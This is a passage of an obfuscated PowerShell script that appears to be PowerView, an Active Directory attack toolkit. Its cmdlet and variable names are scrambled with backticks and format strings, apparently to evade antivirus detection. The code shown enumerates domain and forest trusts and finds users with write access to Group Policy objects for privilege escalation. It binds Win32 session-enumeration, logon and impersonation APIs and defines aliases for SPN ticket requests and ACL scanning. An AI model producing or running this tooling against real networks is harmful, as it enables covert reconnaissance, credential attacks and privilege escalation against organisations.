    if (${PSbO`UnDPARA`MEt`eRS}['ResultPageSize']) { ${Dom`A`intr`UsTAr`GuM`eN`Ts}['ResultPageSize'] = ${RE`S`Ult`pAGESizE} }
    if (${PS`Bou`N`d`PARa`MEters}['ServerTimeLimit']) { ${DoMAInT`RustArgu`MeN`TS}['ServerTimeLimit'] = ${s`eRVe`RTiMELi`MIT} }
    if (${P`SbOuN`DParA`MEtErs}['Tombstone']) { ${D`O`M`A`INtrustArgumeN`Ts}['Tombstone'] = ${TO`M`BSt`oNE} }
    if (${p`sBou`N`dPaRaMET`E`RS}['Credential']) { ${DO`MAintRUsTA`RguM`EN`Ts}['Credential'] = ${C`R`EdENTi`AL} }

    # get the current domain and push it onto the stack
    if (${ps`BoUnDp`ARA`mEte`RS}['Credential']) {
        ${CURrE`Nt`Do`M`Ain} = (&("{3}{2}{1}{0}" -f 'ain','m','o','Get-D') -Credential ${CR`edENT`I`AL}).Name
    }
    else {
        ${C`Ur`ReNTd`OMain} = (&("{0}{1}{2}" -f'Get-','Doma','in')).Name
    }
    ${dOMa`i`Ns}.Push(${cuRR`ENtDO`MAIN})

    while(${d`O`MAINS}.Count -ne 0) {

        ${DoMA`In} = ${d`oM`AIns}.Pop()

        # if we haven't seen this domain before
        if (${D`omaIN} -and (${d`om`AiN}.Trim() -ne '') -and (-not ${sEend`oM`AINs}.ContainsKey(${dOMA`in}))) {

            &("{2}{1}{3}{0}" -f'ose','r','Write-Ve','b') "[Get-DomainTrustMapping] Enumerating trusts for domain: '$Domain'"

            # mark it as seen in our list
            ${n`ULL} = ${SeEN`doMa`ins}.Add(${do`maIN}, '')

            try {
                # get all the trusts for this domain
                ${DO`mAintR`UsTAr`g`U`Men`Ts}['Domain'] = ${Dom`AIN}
                ${TRu`s`Ts} = &("{1}{2}{0}{3}"-f 'DomainTrus','G','et-','t') @DomainTrustArguments

                if (${T`RuSts} -isnot [System.Array]) {
                    ${TRu`S`TS} = @(${tR`USts})
                }

                # get any forest trusts, if they exist
                if (${PsC`MD`lET}.ParameterSetName -eq 'NET') {
                    ${F`o`RE`STtrU`starG`UmENTs} = @{}
                    if (${PsBo`UN`DPARA`M`E`Ters}['Forest']) { ${FOREStTRustar`G`Um`enTS}['Forest'] = ${FO`RESt} }
                    if (${pSBoUN`Dp`Ar`A`meters}['Credential']) { ${forE`s`Tt`RusTargUmE`NTS}['Credential'] = ${c`Red`EnT`iAL} }
                    ${Tr`UStS} += &("{0}{2}{1}{3}"-f'G','Fore','et-','stTrust') @ForestTrustArguments
                }

                if (${TR`US`Ts}) {
                    if (${tRuS`Ts} -isnot [System.Array]) {
                        ${TRuS`TS} = @(${tru`s`Ts})
                    }

                    # enumerate each trust found
                    ForEach (${T`RU`st} in ${tRu`S`Ts}) {
                        if (${T`R`Ust}.SourceName -and ${t`RUst}.TargetName) {
                            # make sure we process the target
                            ${Nu`LL} = ${DO`mAInS}.Push(${T`RuSt}.TargetName)
                            ${T`RUst}
                        }
                    }
                }
            }
            catch {
                &("{1}{0}{2}{3}"-f 'Verb','Write-','o','se') "[Get-DomainTrustMapping] Error: $_"
            }
        }
    }
}


function g`ET-Gpod`E`LeGATi`ON {
<#
.SYNOPSIS

Finds users with write permissions on GPO objects which may allow privilege escalation within the domain.

Author: Itamar Mizrahi (@MrAnde7son)  
License: BSD 3-Clause  
Required Dependencies: None  

.PARAMETER GPOName

The GPO display name to query for, wildcards accepted.

.PARAMETER PageSize

Specifies the PageSize to set for the LDAP searcher object.

.EXAMPLE

Get-GPODelegation

Returns all GPO delegations in current forest.

.EXAMPLE

Get-GPODelegation -GPOName

Returns all GPO delegations on a given GPO.
#>

    [CmdletBinding()]
    Param (
        [String]
        ${g`pO`NaMe} = '*',

        [ValidateRange(1,10000)] 
        [Int]
        ${PaGEsi`Ze} = 200
    )

    ${e`xCLUSi`ONs} = @('SYSTEM','Domain Admins','Enterprise Admins')

    ${F`Or`eST} = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    ${d`omaIn`l`ist} = @(${FO`R`est}.Domains)
    ${dO`ma`iNs} = ${DOMa`I`NL`iSt} | &("{0}{1}{2}" -f 'fore','a','ch') { ${_}.GetDirectoryEntry() }
    foreach (${dOM`AiN} in ${d`O`MAiNS}) {
        ${fiL`T`er} = "(&(objectCategory=groupPolicyContainer)(displayname=$GPOName))"
        ${SE`A`RCHER} = &("{1}{0}{2}"-f 'ec','New-Obj','t') ("{5}{0}{1}{9}{7}{4}{3}{8}{6}{11}{10}{2}{12}"-f'st','em.Direc','arch','Serv','y','Sy','es.Dire','or','ic','t','torySe','c','er')
        ${sE`ArCh`Er}.SearchRoot = ${d`oMA`In}
        ${s`e`ARcHER}.Filter = ${fIl`Ter}
        ${seAr`ChEr}.PageSize = ${PAgeSI`Ze}
        ${s`Ear`chER}.SearchScope = "Subtree"
        ${li`stg`Po} = ${SeA`Rch`Er}.FindAll()
        foreach (${G`PO} in ${lIStg`PO}){
            ${a`CL} = ([ADSI]${g`PO}.path).ObjectSecurity.Access | &('?') {${_}.ActiveDirectoryRights -match "Write" -and ${_}.AccessControlType -eq "Allow" -and  ${exCL`USIo`NS} -notcontains ${_}.IdentityReference.toString().split("\")[1] -and ${_}.IdentityReference -ne "CREATOR OWNER"}
        if (${a`cL} -ne ${Nu`LL}){
            ${gp`oa`Cl} = &("{0}{1}{2}"-f'New-Obje','c','t') ("{0}{1}"-f'ps','object')
            ${GpoA`CL} | &("{0}{1}{2}" -f 'Add-Mem','b','er') ("{3}{2}{1}{0}"-f'y','ropert','p','Note') 'ADSPath' ${g`PO}.Properties.adspath
            ${gPo`ACl} | &("{0}{2}{1}" -f 'A','d-Member','d') ("{0}{1}{2}" -f'Notepro','per','ty') 'GPODisplayName' ${G`Po}.Properties.displayname
            ${g`POaCL} | &("{2}{1}{0}" -f'-Member','d','Ad') ("{3}{0}{2}{1}" -f 'otepr','perty','o','N') 'IdentityReference' ${A`cl}.IdentityReference
            ${G`Po`AcL} | &("{2}{1}{0}"-f'er','dd-Memb','A') ("{0}{2}{1}"-f'Notepro','y','pert') 'ActiveDirectoryRights' ${a`cl}.ActiveDirectoryRights
            ${gP`o`Acl}
        }
        }
    }
}


########################################################
#
# Expose the Win32API functions and datastructures below
# using PSReflect.
# Warning: Once these are executed, they are baked in
# and can't be changed while the script is running!
#
########################################################

${m`OD} = &("{1}{3}{2}{4}{0}"-f 'le','N','Me','ew-In','moryModu') -ModuleName ("{1}{0}" -f'n32','Wi')

# [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPositionalParameters', Scope='Function', Target='psenum')]

# used to parse the 'samAccountType' property for users/computers/groups
${SAMAc`c`OUnttY`peenum} = &("{1}{0}" -f 'num','pse') ${M`Od} ("{0}{6}{4}{2}{1}{5}{3}"-f'PowerV','am','w.S','ntTypeEnum','e','Accou','i') ("{1}{0}" -f'32','UInt') @{
    DOMAIN_OBJECT                   =   '0x00000000'
    GROUP_OBJECT                    =   '0x10000000'
    NON_SECURITY_GROUP_OBJECT       =   '0x10000001'
    ALIAS_OBJECT                    =   '0x20000000'
    NON_SECURITY_ALIAS_OBJECT       =   '0x20000001'
    USER_OBJECT                     =   '0x30000000'
    MACHINE_ACCOUNT                 =   '0x30000001'
    TRUST_ACCOUNT                   =   '0x30000002'
    APP_BASIC_GROUP                 =   '0x40000000'
    APP_QUERY_GROUP                 =   '0x40000001'
    ACCOUNT_TYPE_MAX                =   '0x7fffffff'
}

# used to parse the 'grouptype' property for groups
${gRoU`PtYPe`EN`UM} = &("{2}{0}{1}"-f 'e','num','ps') ${m`Od} ("{3}{1}{4}{2}{0}"-f 'um','erV','roupTypeEn','Pow','iew.G') ("{1}{0}" -f'32','UInt') @{
    CREATED_BY_SYSTEM               =   '0x00000001'
    GLOBAL_SCOPE                    =   '0x00000002'
    DOMAIN_LOCAL_SCOPE              =   '0x00000004'
    UNIVERSAL_SCOPE                 =   '0x00000008'
    APP_BASIC                       =   '0x00000010'
    APP_QUERY                       =   '0x00000020'
    SECURITY                        =   '0x80000000'
} -Bitfield

# used to parse the 'userAccountControl' property for users/groups
${U`AcEN`Um} = &("{0}{2}{1}"-f 'p','num','se') ${M`oD} ("{3}{2}{0}{1}" -f'U','ACEnum','iew.','PowerV') ("{0}{1}" -f'UIn','t32') @{
    SCRIPT                          =   1
    ACCOUNTDISABLE                  =   2
    HOMEDIR_REQUIRED                =   8
    LOCKOUT                         =   16
    PASSWD_NOTREQD                  =   32
    PASSWD_CANT_CHANGE              =   64
    ENCRYPTED_TEXT_PWD_ALLOWED      =   128
    TEMP_DUPLICATE_ACCOUNT          =   256
    NORMAL_ACCOUNT                  =   512
    INTERDOMAIN_TRUST_ACCOUNT       =   2048
    WORKSTATION_TRUST_ACCOUNT       =   4096
    SERVER_TRUST_ACCOUNT            =   8192
    DONT_EXPIRE_PASSWORD            =   65536
    MNS_LOGON_ACCOUNT               =   131072
    SMARTCARD_REQUIRED              =   262144
    TRUSTED_FOR_DELEGATION          =   524288
    NOT_DELEGATED                   =   1048576
    USE_DES_KEY_ONLY                =   2097152
    DONT_REQ_PREAUTH                =   4194304
    PASSWORD_EXPIRED                =   8388608
    TRUSTED_TO_AUTH_FOR_DELEGATION  =   16777216
    PARTIAL_SECRETS_ACCOUNT         =   67108864
} -Bitfield

# enum used by $WTS_SESSION_INFO_1 below
${WT`sc`oNn`EcT`STatE} = &("{0}{2}{1}" -f 'p','num','se') ${M`Od} ("{3}{2}{0}{1}{4}" -f'T','E_CL','ONNECTSTA','WTS_C','ASS') ("{0}{1}"-f 'UInt1','6') @{
    Active       =    0
    Connected    =    1
    ConnectQuery =    2
    Shadow       =    3
    Disconnected =    4
    Idle         =    5
    Listen       =    6
    Reset        =    7
    Down         =    8
    Init         =    9
}

# the WTSEnumerateSessionsEx result structure
${W`TS_`sESSIOn_i`N`FO_1} = &("{0}{1}{2}" -f'st','ru','ct') ${M`OD} ("{3}{2}{4}{5}{0}{1}{6}{7}" -f '.RDPSessi','o','r','Powe','Vie','w','nI','nfo') @{
    ExecEnvId = &("{1}{0}"-f'd','fiel') 0 ("{0}{1}"-f'UIn','t32')
    State = &("{1}{0}"-f'ield','f') 1 ${W`Tscon`NEc`T`StaTE}
    SessionId = &("{0}{1}"-f 'fiel','d') 2 ("{1}{0}" -f't32','UIn')
    pSessionName = &("{0}{1}" -f 'f','ield') 3 ("{0}{2}{1}" -f'S','g','trin') -MarshalAs @('LPWStr')
    pHostName = &("{0}{1}" -f'fiel','d') 4 ("{0}{1}"-f'Str','ing') -MarshalAs @('LPWStr')
    pUserName = &("{0}{1}" -f 'fie','ld') 5 ("{0}{1}{2}" -f 'Stri','n','g') -MarshalAs @('LPWStr')
    pDomainName = &("{0}{1}" -f'fie','ld') 6 ("{1}{0}" -f'tring','S') -MarshalAs @('LPWStr')
    pFarmName = &("{1}{0}"-f 'eld','fi') 7 ("{1}{0}{2}" -f 'trin','S','g') -MarshalAs @('LPWStr')
}

# the particular WTSQuerySessionInformation result structure
${WTs_c`lI`E`NT`_ADD`ReSs} = &("{0}{1}"-f 'str','uct') ${M`Od} ("{2}{0}{3}{1}" -f 'TS_CLIE','T_ADDRESS','W','N') @{
    AddressFamily = &("{0}{1}"-f 'f','ield') 0 ("{2}{0}{1}"-f't3','2','UIn')
    Address = &("{0}{1}" -f'fiel','d') 1 ("{1}{0}" -f'e[]','Byt') -MarshalAs @('ByValArray', 20)
}

# the NetShareEnum result structure
${S`har`E_`In`FO_1} = &("{0}{2}{1}"-f 's','ruct','t') ${m`OD} ("{3}{0}{2}{1}"-f'erVie','.ShareInfo','w','Pow') @{
    Name = &("{0}{1}" -f 'f','ield') 0 ("{0}{1}{2}"-f'St','r','ing') -MarshalAs @('LPWStr')
    Type = &("{1}{0}"-f 'ld','fie') 1 ("{0}{1}" -f 'UIn','t32')
    Remark = &("{1}{0}"-f'ield','f') 2 ("{1}{0}" -f'g','Strin') -MarshalAs @('LPWStr')
}

# the NetWkstaUserEnum result structure
${WK`S`T`A_uS`er_iNFO_1} = &("{0}{1}"-f 's','truct') ${m`oD} ("{3}{4}{2}{5}{1}{0}"-f'erInfo','Us','Logge','Power','View.','dOn') @{
    UserName = &("{0}{1}"-f'fi','eld') 0 ("{0}{1}" -f'St','ring') -MarshalAs @('LPWStr')
    LogonDomain = &("{1}{0}"-f 'd','fiel') 1 ("{1}{0}"-f 'ng','Stri') -MarshalAs @('LPWStr')
    AuthDomains = &("{1}{0}" -f 'd','fiel') 2 ("{0}{1}"-f'S','tring') -MarshalAs @('LPWStr')
    LogonServer = &("{0}{1}" -f 'fi','eld') 3 ("{1}{0}" -f 'ing','Str') -MarshalAs @('LPWStr')
}

# the NetSessionEnum result structure
${s`e`ssiO`N`_iNfo_10} = &("{0}{1}"-f 'st','ruct') ${m`oD} ("{3}{1}{4}{2}{0}"-f 'fo','werV','ssionIn','Po','iew.Se') @{
    CName = &("{1}{0}" -f 'eld','fi') 0 ("{0}{1}" -f'Strin','g') -MarshalAs @('LPWStr')
    UserName = &("{1}{0}" -f'd','fiel') 1 ("{2}{1}{0}"-f 'g','trin','S') -MarshalAs @('LPWStr')
    Time = &("{1}{0}"-f 'eld','fi') 2 ("{0}{1}" -f 'UInt3','2')
    IdleTime = &("{1}{0}"-f'ld','fie') 3 ("{2}{1}{0}" -f '32','Int','U')
}

# enum used by $LOCALGROUP_MEMBERS_INFO_2 below
${S`id_NaME`_usE} = &("{0}{1}"-f 'psenu','m') ${M`oD} ("{1}{0}{2}{3}" -f'_N','SID','AM','E_USE') ("{2}{1}{0}" -f '16','Int','U') @{
    SidTypeUser             = 1
    SidTypeGroup            = 2
    SidTypeDomain           = 3
    SidTypeAlias            = 4
    SidTypeWellKnownGroup   = 5
    SidTypeDeletedAccount   = 6
    SidTypeInvalid          = 7
    SidTypeUnknown          = 8
    SidTypeComputer         = 9
}

# the NetLocalGroupEnum result structure
${lOcAlg`ROu`p_iN`FO_1} = &("{0}{1}" -f'struc','t') ${m`OD} ("{2}{3}{1}{0}"-f'UP_INFO_1','O','LOC','ALGR') @{
    lgrpi1_name = &("{0}{1}"-f 'fiel','d') 0 ("{0}{1}" -f 'St','ring') -MarshalAs @('LPWStr')
    lgrpi1_comment = &("{0}{1}"-f 'f','ield') 1 ("{0}{1}{2}"-f 'Str','in','g') -MarshalAs @('LPWStr')
}

# the NetLocalGroupGetMembers result structure
${LoCAl`gR`o`UP`_m`Embers_`i`Nf`o_2} = &("{0}{1}"-f 's','truct') ${m`OD} ("{3}{0}{1}{5}{4}{2}" -f'L','GR','FO_2','LOCA','MEMBERS_IN','OUP_') @{
    lgrmi2_sid = &("{0}{1}"-f'fi','eld') 0 ("{2}{1}{0}" -f 'Ptr','nt','I')
    lgrmi2_sidusage = &("{0}{1}" -f'fi','eld') 1 ${sid_`Nam`e_uSe}
    lgrmi2_domainandname = &("{0}{1}" -f 'fiel','d') 2 ("{1}{0}" -f 'ing','Str') -MarshalAs @('LPWStr')
}

# enums used in DS_DOMAIN_TRUSTS
${DSDOMAIn`F`L`Ag} = &("{0}{1}"-f'p','senum') ${M`oD} ("{2}{3}{1}{0}"-f 'gs','ain.Fla','D','sDom') ("{1}{0}{2}" -f 't','UIn','32') @{
    IN_FOREST       = 1
    DIRECT_OUTBOUND = 2
    TREE_ROOT       = 4
    PRIMARY         = 8
    NATIVE_MODE     = 16
    DIRECT_INBOUND  = 32
} -Bitfield
${DsD`omain`TrUst`TY`Pe} = &("{0}{1}" -f 'ps','enum') ${m`Od} ("{1}{3}{2}{0}"-f 'ustType','Ds','n.Tr','Domai') ("{2}{0}{1}" -f 'nt3','2','UI') @{
    DOWNLEVEL   = 1
    UPLEVEL     = 2
    MIT         = 3
    DCE         = 4
}
${d`SDOm`AIntRusT`A`TtrI`B`U`TES} = &("{0}{1}"-f 'psen','um') ${m`od} ("{4}{1}{0}{2}{3}"-f 'main.Tr','sDo','ustAttri','butes','D') ("{0}{1}" -f'UIn','t32') @{
    NON_TRANSITIVE      = 1
    UPLEVEL_ONLY        = 2
    FILTER_SIDS         = 4
    FOREST_TRANSITIVE   = 8
    CROSS_ORGANIZATION  = 16
    WITHIN_FOREST       = 32
    TREAT_AS_EXTERNAL   = 64
}

# the DsEnumerateDomainTrusts result structure
${Ds_domai`N_T`RU`Sts} = &("{0}{1}" -f 'st','ruct') ${m`od} ("{4}{2}{0}{5}{1}{3}" -f'MAIN_T','ST','O','S','DS_D','RU') @{
    NetbiosDomainName = &("{1}{0}" -f'd','fiel') 0 ("{1}{0}" -f 'ring','St') -MarshalAs @('LPWStr')
    DnsDomainName = &("{0}{1}" -f'fi','eld') 1 ("{1}{0}"-f 'ng','Stri') -MarshalAs @('LPWStr')
    Flags = &("{1}{0}"-f'd','fiel') 2 ${d`s`DomA`INFlaG}
    ParentIndex = &("{1}{0}"-f 'eld','fi') 3 ("{0}{1}"-f 'U','Int32')
    TrustType = &("{0}{1}" -f 'fi','eld') 4 ${d`SD`Om`A`iNt`RUSttype}
    TrustAttributes = &("{1}{0}" -f 'eld','fi') 5 ${dSdoMAi`NtRU`staT`T`RI`BuT`ES}
    DomainSid = &("{0}{1}"-f'fie','ld') 6 ("{1}{0}" -f 'tPtr','In')
    DomainGuid = &("{1}{0}" -f'eld','fi') 7 ("{0}{1}" -f 'G','uid')
}

# used by WNetAddConnection2W
${n`E`TreSou`RcEW} = &("{1}{0}" -f'truct','s') ${M`od} ("{0}{2}{1}" -f'NE','ESOURCEW','TR') @{
    dwScope =         &("{0}{1}" -f'fi','eld') 0 ("{0}{1}" -f'UInt','32')
    dwType =          &("{0}{1}"-f 'f','ield') 1 ("{0}{1}"-f'UI','nt32')
    dwDisplayType =   &("{1}{0}"-f 'd','fiel') 2 ("{1}{0}" -f '2','UInt3')
    dwUsage =         &("{0}{1}" -f'fiel','d') 3 ("{1}{0}"-f '32','UInt')
    lpLocalName =     &("{0}{1}"-f'f','ield') 4 ("{0}{1}"-f 'Strin','g') -MarshalAs @('LPWStr')
    lpRemoteName =    &("{1}{0}"-f'ld','fie') 5 ("{0}{2}{1}" -f'St','g','rin') -MarshalAs @('LPWStr')
    lpComment =       &("{1}{0}"-f'ld','fie') 6 ("{1}{0}" -f 'g','Strin') -MarshalAs @('LPWStr')
    lpProvider =      &("{0}{1}" -f 'fie','ld') 7 ("{1}{0}" -f'ng','Stri') -MarshalAs @('LPWStr')
}

# all of the Win32 API functions we need
${fUn`CtIO`NdEFIN`IT`i`ONs} = @(
    (&("{1}{0}"-f 'c','fun') ("{1}{0}"-f'2','netapi3') ("{1}{0}{2}" -f'hareE','NetS','num') ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (&("{1}{0}" -f'unc','f') ("{1}{2}{0}" -f 'i32','neta','p') ("{2}{0}{4}{1}{3}"-f 'ta','er','NetWks','Enum','Us') ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (&("{0}{1}"-f 'fun','c') ("{0}{1}{2}"-f 'net','ap','i32') ("{1}{4}{3}{2}{0}" -f'Enum','N','on','Sessi','et') ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (&("{0}{1}"-f'f','unc') ("{1}{0}" -f'i32','netap') ("{3}{5}{2}{0}{4}{1}" -f'calGrou','um','Lo','N','pEn','et') ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (&("{0}{1}"-f 'f','unc') ("{1}{0}" -f'etapi32','n') ("{5}{0}{4}{1}{2}{6}{3}"-f 'etLo','Gro','upGetM','s','cal','N','ember') ([Int]) @([String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (&("{1}{0}" -f 'nc','fu') ("{1}{0}"-f 'api32','net') ("{4}{2}{0}{1}{3}"-f'Si','teNa','sGet','me','D') ([Int]) @([String], [IntPtr].MakeByRefType())),
    (&("{1}{0}" -f 'unc','f') ("{0}{1}{2}"-f 'net','ap','i32') ("{1}{5}{0}{2}{3}{4}"-f 'ateDo','DsE','m','ainTrust','s','numer') ([Int]) @([String], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType())),
    (&("{1}{0}" -f 'unc','f') ("{0}{2}{1}" -f 'ne','32','tapi') ("{3}{0}{2}{1}{4}"-f'e','piBufferF','tA','N','ree') ([Int]) @([IntPtr])),
    (&("{1}{0}"-f'c','fun') ("{0}{2}{1}" -f'adv','i32','ap') ("{1}{0}{4}{2}{3}" -f 'nvertSidTo','Co','i','ngSid','Str') ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError),
    (&("{0}{1}" -f 'fun','c') ("{1}{2}{0}" -f '2','advap','i3') ("{3}{4}{2}{1}{0}" -f'erW','Manag','SC','Ope','n') ([IntPtr]) @([String], [String], [Int]) -SetLastError),
    (&("{0}{1}"-f 'fun','c') ("{0}{1}{2}" -f'advap','i3','2') ("{0}{2}{1}{3}" -f 'CloseServi','an','ceH','dle') ([Int]) @([IntPtr])),
    (&("{1}{0}" -f 'nc','fu') ("{0}{1}{2}" -f'ad','v','api32') ("{0}{1}"-f 'LogonUse','r') ([Bool]) @([String], [String], [String], [UInt32], [UInt32], [IntPtr].MakeByRefType()) -SetLastError),
    (&("{0}{1}"-f'fu','nc') ("{0}{1}{2}"-f'advap','i','32') ("{4}{3}{0}{2}{1}{7}{6}{5}"-f 'r','ogge','sonateL','mpe','I','r','se','dOnU') ([Bool]) @([IntPtr]) -SetLastError),
    (&("{0}{1}"-f 'fu','nc') ("{1}{2}{0}"-f '32','adva','pi') ("{2}{3}{1}{0}"-f'lf','ToSe','Rev','ert') ([Bool]) @() -SetLastError),
    (&("{0}{1}"-f'f','unc') ("{2}{0}{1}"-f 'ap','i32','wts') ("{1}{4}{0}{3}{2}"-f 'penSe','W','verEx','r','TSO') ([IntPtr]) @([String])),
    (&("{1}{0}" -f 'nc','fu') ("{2}{0}{1}" -f'tsap','i32','w') ("{3}{0}{1}{2}"-f'me','rateSess','ionsEx','WTSEnu') ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (&("{0}{1}"-f 'f','unc') ("{0}{1}{2}"-f'wtsapi','3','2') ("{2}{0}{5}{3}{4}{1}" -f'e','tion','WTSQueryS','sio','nInforma','s') ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (&("{0}{1}"-f'f','unc') ("{0}{1}"-f 'wts','api32') ("{2}{0}{1}" -f'eeMemor','yEx','WTSFr') ([Int]) @([Int32], [IntPtr], [Int32])),
    (&("{1}{0}"-f'nc','fu') ("{1}{0}{2}"-f'i','wtsap','32') ("{3}{2}{1}{0}"-f 'mory','reeMe','TSF','W') ([Int]) @([IntPtr])),
    (&("{0}{1}"-f'fu','nc') ("{2}{0}{1}" -f'sa','pi32','wt') ("{3}{0}{1}{2}"-f 'SC','lose','Server','WT') ([Int]) @([IntPtr])),
    (&("{1}{0}" -f'unc','f') ("{0}{1}" -f'Mp','r') ("{4}{1}{2}{3}{0}"-f'W','tA','ddC','onnection2','WNe') ([Int]) @(${NeTrE`S`OURCew}, [String], [String], [UInt32])),
    (&("{0}{1}" -f'fu','nc') ("{0}{1}"-f'M','pr') ("{3}{0}{2}{4}{5}{1}" -f'N','nnection2','etCance','W','lC','o') ([Int]) @([String], [Int], [Bool])),
    (&("{0}{1}" -f 'fu','nc') ("{0}{1}"-f 'kernel','32') ("{2}{0}{1}" -f'oseHandl','e','Cl') ([Bool]) @([IntPtr]) -SetLastError)
)

${TY`P`Es} = ${fUnCT`io`N`defiN`iTio`NS} | &("{3}{1}{4}{2}{0}"-f '32Type','d','-Win','A','d') -Module ${m`od} -Namespace 'Win32'
${nETa`P`I32} = ${TY`peS}['netapi32']
${aD`V`ApI32} = ${TYp`eS}['advapi32']
${W`TSaPi`32} = ${TyP`Es}['wtsapi32']
${m`PR} = ${tYp`es}['Mpr']
${ke`RN`eL32} = ${t`ypEs}['kernel32']

&("{0}{1}{2}" -f'Se','t-Alia','s') ("{2}{3}{0}{1}"-f'-IPAd','dress','G','et') ("{1}{2}{4}{0}{3}" -f's','Resolv','e','s','-IPAddre')
&("{1}{2}{0}"-f's','Set-','Alia') ("{1}{0}{3}{4}{2}" -f'nv','Co','Sid','er','t-NameTo') ("{1}{0}{3}{2}" -f 'o-S','ConvertT','D','I')
&("{1}{0}" -f'ias','Set-Al') ("{0}{1}{3}{4}{2}{5}" -f 'Con','ve','idToNam','r','t-S','e') ("{4}{1}{0}{3}{2}"-f'tFrom','ver','SID','-','Con')
&("{2}{1}{0}" -f 'lias','t-A','Se') ("{2}{0}{4}{1}{3}" -f'e','c','Requ','ket','st-SPNTi') ("{2}{1}{0}{3}{4}" -f 'in','ma','Get-Do','SPNTick','et')
&("{0}{1}{2}"-f 'Set-','Ali','as') ("{1}{3}{2}{0}" -f'NSZone','Get','D','-') ("{1}{3}{2}{0}"-f 'one','Get-D','NSZ','omainD')
&("{0}{2}{1}"-f'Set','as','-Ali') ("{2}{0}{1}"-f 'SRe','cord','Get-DN') ("{4}{1}{3}{0}{2}" -f'SR','-Do','ecord','mainDN','Get')
&("{2}{1}{0}" -f 'lias','et-A','S') ("{2}{1}{3}{0}" -f 'main','et-NetD','G','o') ("{3}{1}{2}{0}"-f 'ain','et-','Dom','G')
&("{2}{3}{1}{0}" -f 's','Alia','Se','t-') ("{4}{2}{0}{5}{1}{3}{6}" -f 'Do','Cont','et','roll','Get-N','main','er') ("{4}{2}{1}{0}{3}"-f 'ntrol','nCo','et-Domai','ler','G')
&("{1}{0}"-f'ias','Set-Al') ("{1}{3}{2}{0}"-f'st','G','etFore','et-N') ("{0}{2}{1}" -f'Get-','est','For')
&("{0}{1}" -f 'Set-','Alias') ("{1}{2}{4}{5}{0}{3}" -f 'ai','Get','-N','n','etFores','tDom') ("{0}{1}{2}{3}" -f 'Ge','t-Fore','stDoma','in')
&("{2}{1}{0}"-f 's','et-Alia','S') ("{1}{3}{2}{0}{4}"-f 'stCat','Get-Ne','re','tFo','alog') ("{3}{0}{2}{5}{4}{6}{1}" -f 'ore','atalog','s','Get-F','Glob','t','alC')
&("{1}{2}{0}"-f 'as','Set-','Ali') ("{1}{3}{0}{2}"-f 'etUs','Get','er','-N') ("{4}{0}{2}{1}{3}" -f'-Do','n','mai','User','Get')
&("{1}{0}"-f'ias','Set-Al') ("{0}{2}{1}{3}" -f 'Get-','en','UserEv','t') ("{5}{0}{1}{3}{2}{4}"-f '-D','o','ainUserEven','m','t','Get')
&("{1}{0}{2}"-f 'et','S','-Alias') ("{1}{3}{2}{4}{0}" -f'Computer','G','t','e','-Net') ("{3}{1}{2}{0}" -f'Computer','o','main','Get-D')
&("{1}{0}{2}" -f 'Alia','Set-','s') ("{1}{0}{2}" -f 'et-ADObj','G','ect') ("{1}{3}{2}{0}"-f 'ect','Get-Do','inObj','ma')
&("{2}{0}{1}" -f 'Alia','s','Set-') ("{3}{2}{1}{0}"-f 'ct','bje','t-ADO','Se') ("{4}{3}{0}{2}{1}"-f '-Doma','Object','in','t','Se')
&("{0}{1}{2}{3}"-f 'Set-','A','l','ias') ("{2}{0}{1}" -f'j','ectAcl','Get-Ob') ("{0}{1}{2}{3}{4}" -f 'G','et-','DomainO','bject','Acl')
&("{2}{1}{0}" -f'ias','l','Set-A') ("{1}{3}{2}{0}"-f'jectAcl','Ad','Ob','d-') ("{4}{1}{5}{2}{0}{3}" -f'i','d-Do','a','nObjectAcl','Ad','m')
&("{1}{2}{0}" -f 'Alias','S','et-') ("{2}{3}{1}{0}"-f'r','LScanne','Invo','ke-AC') ("{4}{2}{3}{1}{0}{5}"-f 'a','gDom','Inte','restin','Find-','inAcl')
&("{1}{2}{0}"-f'lias','Se','t-A') ("{0}{2}{1}" -f'Get-GUIDM','p','a') ("{4}{0}{3}{2}{1}"-f 't-','p','ainGUIDMa','Dom','Ge')
&("{0}{1}{2}" -f'S','e','t-Alias') ("{0}{2}{1}" -f 'Get-','tOU','Ne') ("{1}{2}{0}"-f 'OU','Get-Do','main')
&("{0}{2}{3}{1}" -f'Se','lias','t','-A') ("{0}{2}{1}"-f 'Get-','tSite','Ne') ("{0}{1}{3}{2}" -f'Get-Dom','a','Site','in')
&("{2}{0}{1}"-f'et-Ali','as','S') ("{1}{0}{2}" -f 'tSubne','Get-Ne','t') ("{3}{2}{0}{4}{1}"-f'inS','t','ma','Get-Do','ubne')
&("{1}{2}{0}" -f'as','S','et-Ali') ("{0}{3}{1}{2}"-f 'Ge','r','oup','t-NetG') ("{3}{2}{0}{1}"-f 'inGr','oup','oma','Get-D')
&("{0}{2}{1}" -f 'Set','Alias','-') ("{4}{3}{2}{5}{1}{0}"-f'ups','rityGro','edSe','Manag','Find-','cu') ("{2}{0}{3}{1}{6}{5}{4}" -f 'M','ge','Get-Domain','ana','roup','urityG','dSec')
&("{0}{2}{3}{1}"-f 'S','lias','e','t-A') ("{4}{3}{1}{2}{0}" -f 'er','p','Memb','-NetGrou','Get') ("{3}{4}{2}{6}{1}{5}{0}"-f 'upMember','i','om','Get-','D','nGro','a')
